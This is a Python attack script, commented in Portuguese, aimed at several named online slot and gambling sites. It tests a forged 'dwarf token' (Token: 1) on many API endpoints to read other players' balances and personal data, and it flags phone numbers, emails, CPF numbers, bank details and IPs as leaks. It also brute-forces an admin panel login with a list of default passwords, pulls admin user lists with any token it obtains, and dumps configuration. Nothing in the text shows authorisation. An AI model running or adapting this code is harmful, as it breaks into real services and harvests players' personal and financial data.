"""
Exploração dos novos vetores descobertos:
1. aphrodite777 — token anão em mais endpoints
2. PA login com formato correto (access_token field)
3. WebSocket handshake correto + auth fraca
4. PA com Authorization header
5. lucky777.mx — token anão
"""
import ssl, urllib.request, urllib.error, json, time, re, base64, struct
from datetime import datetime, timezone

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

RESULTS = []
SEV = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🔵","info":"⚪"}

def req(method, url, body=None, headers=None):
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json, */*"}
    if body is not None: h["Content-Type"] = "application/json"
    if headers: h.update(headers)
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8","ignore")
            try: return resp.status, dict(resp.headers), json.loads(raw)
            except: return resp.status, dict(resp.headers), {"_raw": raw[:600]}
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, {}, json.loads(raw)
        except: return e.code, {}, {"_raw": raw[:400]}
    except Exception as ex:
        return 0, {}, {"err": str(ex)}

def rec(cat, test, rq, rs, interp, sev="info"):
    RESULTS.append({"ts":datetime.now(timezone.utc).isoformat(),
                    "cat":cat,"test":test,"rq":rq,"rs":rs,"interp":interp,"sev":sev})
    code = rs.get("code","?") if isinstance(rs,dict) else "?"
    msg  = str(rs.get("msg",""))[:50] if isinstance(rs,dict) else ""
    print(f"  {SEV.get(sev,'⚪')} [{cat}/{test[:55]}] code={code} msg={msg!r}")
    if sev in ("critical","high"):
        print(f"     ↪ {interp}")

# ═══════════════════════════════════════════════════════
# 1. aphrodite777 — mapear token anão em mais endpoints
# ═══════════════════════════════════════════════════════

print("=" * 60)
print("1. APHRODITE777 — TOKEN ANÃO MAPEAMENTO COMPLETO")
print("=" * 60)

APH = "https://ds.aphrodite777.com"

endpoints_to_test = [
    ("GET",  "/japi/user/balance/querySimpleBalance"),
    ("GET",  "/japi/user/api/signIn/customerSignConfig"),
    ("POST", "/japi/user/api/signIn/v2/signIn"),
    ("GET",  "/japi/user/getExtraInfo"),
    ("GET",  "/japi/user/getDama"),
    ("GET",  "/japi/user/vip/getAllDisplayVo"),
    ("GET",  "/japi/invite/boxConfig/boxReceiveRecord"),
    ("POST", "/prod-api/set/get"),
    ("POST", "/prod-api/set/mains"),
    # Endpoints que podem existir e ter dados de identidade
    ("POST", "/prod-api/player/info"),
    ("GET",  "/prod-api/player/info"),
    ("POST", "/prod-api/pay-service/bank"),
    ("GET",  "/prod-api/pay-service/bank"),
    ("GET",  "/prod-api/payment/balance-less/list"),
    ("GET",  "/prod-api/pay-service/recharge-list"),
]

body_default = {"appPackageName":"com.slots.big","appVersion":"1.0.0"}

for method, path in endpoints_to_test:
    b = body_default if method == "POST" else None
    # Token anão uid=1
    st1, _, b1 = req(method, APH + path, b, {"Token":"1","Origin":APH,"Referer":APH+"/"})
    c1 = b1.get("code") if isinstance(b1,dict) else None
    d1 = b1.get("data") if isinstance(b1,dict) else None

    # Sentinel inválido
    st2, _, b2 = req(method, APH + path, b, {"Token":"zzz","Origin":APH,"Referer":APH+"/"})
    c2 = b2.get("code") if isinstance(b2,dict) else None

    if c1 == 200 and c2 != 200:
        # Vulnerável ao token anão
        sensitive = []
        if isinstance(d1, dict):
            sensitive = [k for k in d1 if any(s in k.lower() for s in
                         ("phone","email","cpf","bank","real_name","ip","client_ip",
                          "password","id_number","account","admin"))]
        sev = "critical" if sensitive else "high"
        rec("aphrodite_dwarf", f"{method} {path}",
            {"host": "aphrodite777", "method": method, "path": path},
            {"code": c1, "data": d1, "data_keys": list(d1.keys()) if isinstance(d1,dict) else None,
             "leaked_pii": sensitive,
             "sample": json.dumps(d1, ensure_ascii=False)[:400] if d1 else None},
            f"Vulnerável ao token anão. PII: {sensitive}" if sensitive else
            f"Vulnerável. Dados: {list(d1.keys()) if isinstance(d1,dict) else d1}",
            sev)
    time.sleep(0.5)

print()

# ═══════════════════════════════════════════════════════
# 2. PA — Login com formato correto (access_token)
# ═══════════════════════════════════════════════════════

print("=" * 60)
print("2. PA — LOGIN COM FORMATO CORRETO")
print("=" * 60)

PA = "https://pa.rainha777slots.com"

# O bundle mostrou que o login espera POST com {username, password}
# e a resposta tem n.access_token
# E o header enviado nas requests é Authorization: Bearer <token>

credentials = [
    ("admin", "admin123"),
    ("admin", "admin"),
    ("admin", "111111"),
    ("admin", "123456"),
    ("admin", "Admin@123"),
    ("admin", "rainha777"),
    ("admin", "Rainha@777"),
    ("agente","agente123"),
    ("super", "super123"),
    ("admin", "admin@2024"),
]

pa_token = None
for user, pwd in credentials:
    st, _, b = req("POST", PA + "/prod-api/system/user/gsf/login",
                   {"username": user, "password": pwd},
                   {"Origin": PA, "Referer": PA + "/login"})
    code = b.get("code") if isinstance(b,dict) else None
    data = b.get("data") if isinstance(b,dict) else None
    msg  = str(b.get("msg",""))[:60] if isinstance(b,dict) else str(b)[:100]

    if code == 200 and data:
        pa_token = (data.get("access_token") or data.get("token") or
                    data.get("tokenValue") or str(data))
        rec("pa_login", f"{user}/{pwd}",
            {"user": user, "pwd": pwd},
            {"code": code, "data": data},
            f"LOGIN DO PA BEM-SUCEDIDO! token={pa_token[:50]}",
            "critical")
        break
    elif code not in (None, 401, 403, 404, 405, 500, 400):
        rec("pa_login", f"{user}/{pwd}",
            {"user": user},
            {"code": code, "msg": msg},
            f"Resposta incomum: {code}",
            "medium")
    time.sleep(0.3)

if not pa_token:
    print("  Nenhuma credencial funcionou no PA.")

# Se tiver token PA, testar endpoints admin com Authorization header
if pa_token:
    print(f"\n  Testando endpoints com token PA: {pa_token[:50]}...")
    admin_endpoints = [
        "/prod-api/system/user/gsf/getUserList",
        "/prod-api/invite/admin/invite/getUserInviteList",
        "/prod-api/invite/admin/invite/getRewardRecordList",
    ]
    for path in admin_endpoints:
        st, _, b = req("GET", PA + path, headers={
            "Authorization": f"Bearer {pa_token}",
            "Origin": PA, "Referer": PA + "/dashboard"
        })
        code = b.get("code") if isinstance(b,dict) else None
        data = b.get("data") if isinstance(b,dict) else None
        if code == 200 and data:
            rec("pa_admin_with_token", path,
                {"path": path},
                {"code": code, "data_type": type(data).__name__,
                 "data": json.dumps(data, ensure_ascii=False)[:500]},
                "Dados admin com token PA!",
                "high")
        time.sleep(0.3)

print()

# ═══════════════════════════════════════════════════════
# 3. WebSocket — handshake real + teste sem auth
# ═══════════════════════════════════════════════════════

print("=" * 60)
print("3. WEBSOCKET — ANÁLISE DO message.js")
print("=" * 60)

# Ler o message.js e extrair os tipos de mensagem definidos
msg_js_path = "bundles/ds.amizade777.com_message.js"
if not __import__("os").path.exists(msg_js_path):
    msg_js_path = "bundles/m.amizade777.com_message.js"

if __import__("os").path.exists(msg_js_path):
    with open(msg_js_path, "r", encoding="utf-8", errors="ignore") as f:
        msg_content = f.read(100000)  # primeiros 100kb

    # Extrair ERROR_CODEs
    error_codes = re.findall(r'([A-Z_]+)\s*=\s*(\d+)\s+([A-Z_]+) value', msg_content)
    print("  Error codes:")
    for name, val, _ in error_codes[:20]:
        print(f"    {name} = {val}")

    # Extrair tipos de mensagem (MSG_TYPE ou similar)
    cmd_types = re.findall(r'@property\s*\{number\}\s*([A-Z_]+)=(\d+)', msg_content)
    print(f"\n  Command/Message types ({len(cmd_types)}):")
    for name, val in cmd_types[:30]:
        print(f"    {name} = {val}")

    # Extrair campos de autenticação do WS
    auth_ws = re.findall(r'.{0,50}(?:token|auth|login|connect|init).{0,50}', msg_content[:20000], re.I)
    print(f"\n  Auth context no WS:")
    seen = set()
    for a in auth_ws[:10]:
        if a[:30] not in seen:
            seen.add(a[:30])
            print(f"    {a!r}")

print()

# ═══════════════════════════════════════════════════════
# 4. lucky777.mx — variações do token anão
# ═══════════════════════════════════════════════════════

print("=" * 60)
print("4. LUCKY777.MX — TOKEN ANÃO")
print("=" * 60)

LUCKY = "https://ds.lucky777.mx"

for uid in [1, 100, 999]:
    st, _, b = req("GET", LUCKY + "/japi/user/balance/querySimpleBalance",
                   headers={"Token": str(uid), "Origin": LUCKY})
    code = b.get("code") if isinstance(b,dict) else None
    data = b.get("data") if isinstance(b,dict) else None
    print(f"  uid={uid}: code={code} data={data}")
    if code == 200 and data:
        rec("lucky777_dwarf", f"uid={uid}",
            {"uid": uid, "host": "lucky777.mx"},
            {"code": code, "data": data},
            f"Token anão funciona em lucky777.mx! data={data}",
            "critical")
    time.sleep(0.5)

# Tentar config dump no lucky777
st, _, b = req("POST", LUCKY + "/prod-api/set/get",
               {"appChannel":"pc","appVersion":"1.0.0","appPackageName":"com.slots.big"},
               {"Origin": LUCKY})
print(f"\n  Config dump lucky777: code={b.get('code')} "
      f"ipWhites={(b.get('data') or {}).get('ab_condition',{}).get('ipWhites')}")

print()

# ═══════════════════════════════════════════════════════
# 5. player/info com token anão (via body) em aphrodite
# ═══════════════════════════════════════════════════════

print("=" * 60)
print("5. PLAYER/INFO VIA BODY TOKEN — TODOS TENANTS")
print("=" * 60)

# O body-token só funciona no player/update. Vamos testar player/info
# e sign-in nos outros tenants com o mesmo padrão

tenants_extra = [
    ("amizade777",  "ds.amizade777.com"),
    ("aphrodite777","ds.aphrodite777.com"),
    ("rainha777",   "ds.rainha777slots.com"),
]

for tenant_name, host in tenants_extra:
    base = f"https://{host}"
    # player/info com token no body
    st, _, b = req("POST", base + "/prod-api/player/info",
                   {"token": "1", "appPackageName": "com.slots.big"},
                   {"Origin": base})
    code = b.get("code") if isinstance(b,dict) else None
    data = b.get("data") if isinstance(b,dict) else None
    print(f"  {tenant_name} player/info (body token=1): code={code}")
    if code == 200 and data:
        ui = data.get("user_info") or data
        leaked_pii = [k for k in ui if any(s in k.lower() for s in
                      ("phone","email","cpf","bank","real_name","ip","client_ip"))]
        rec("player_info_body_token", f"{tenant_name}",
            {"host": host, "token_in_body": 1},
            {"code": code,
             "data_keys": list(ui.keys()) if isinstance(ui,dict) else None,
             "leaked_pii": leaked_pii,
             "phone": ui.get("phone") if isinstance(ui,dict) else None,
             "user_id": ui.get("user_id") if isinstance(ui,dict) else None},
            f"player/info com token no body! PII: {leaked_pii}",
            "critical" if leaked_pii else "high")
    time.sleep(0.5)

# ═══════════════════════════════════════════════════════
# Salvar
# ═══════════════════════════════════════════════════════

with open("novos_vetores_resultados.json","w",encoding="utf-8") as f:
    json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

crits = [e for e in RESULTS if e["sev"] in ("critical","high")]
print(f"\n{'='*60}")
print(f"TOTAL: {len(crits)} achados high/critical de {len(RESULTS)}")
for e in crits:
    print(f"  {SEV.get(e['sev'],'?')} {e['cat']}/{e['test'][:60]}")
    print(f"    {e['interp'][:100]}")

print(f"\n✅ novos_vetores_resultados.json")
